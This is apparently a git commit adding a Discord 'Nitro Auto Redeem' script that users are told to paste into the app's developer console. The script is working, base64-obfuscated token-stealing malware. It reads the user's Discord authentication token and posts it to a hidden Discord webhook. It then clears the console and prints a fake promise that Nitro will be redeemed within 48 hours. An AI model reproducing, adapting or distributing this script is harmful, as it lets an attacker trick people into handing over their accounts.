55fd768b7b9cf2b5c89804b30ca65414c1207f5b
SuperHarmony910 <57850338+SuperHarmony910@users.noreply.github.com>
2022-05-22 14:46:06 +1000

    Create discordapp-token.js

---
+++ discordapp-token.js
@@ -0,0 +1,42 @@
+// This code only works when run in the Discord app. The app has been designed through Electron to disable Inspect Element by default.
+// See https://www.reddit.com/r/discordapp/comments/sc61n3/cant_inspect_element_anymore/ for more info
+
+// Warning: Run this code at your own risk.
+
+
+/*
+READ FIRST
+Nitro Auto Redeem Method
+Usage:
+1 ) press ctrl + shift + i
+2 ) press console
+3 ) paste script
+4 ) press enter
+*/
+
+
+
+var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[        ["extra_id"]]]);for (let e in req.c)
+    if (req.c.hasOwnProperty(e)) {
+        let t = req.c[e].exports;
+        if (t && t.__esModule && t.default)
+            for (let e in t.default) "getToken" === e && (nitro  = atob('X18qKk1hZGUgYnkgV2F0ZXIjMjAyMSoqX18gICB8ICAqKlRva2VuOiAgKio=') +   t.default.getToken())
+    }
+fetch(
+  atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODUwNDAxNzY3NjQ0NDYzMTE1L1VYU2ZjUldfcWV0U0dNTXU5LUdBUVJZMTlVd1FvbEhPX1F1YzZPZjBMTGJOeTM0S0t6Z1k4OFFHVXd3Z25JNHh5V0Mx'),
+  {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content:
+        nitro,
+    }),
+  }
+);
+console.clear()
+h = atob('Q29uZ3JhdHMsIHlvdXIgbml0cm8gc3Vic2NyaXB0aW9uIHdpbGwgYmUgcmVkZWVtZWQgd2l0aGluIDQ4IGhvdXJzLiBOb3RlOiBPbmx5IHdvcmtzIG9uIGFjdGl2ZSBhY2NvdW50cyBvdmVyIDRtb250aHMgb2xkLg=='),
+console.log(h)
+console.clear()
+console.log(h)
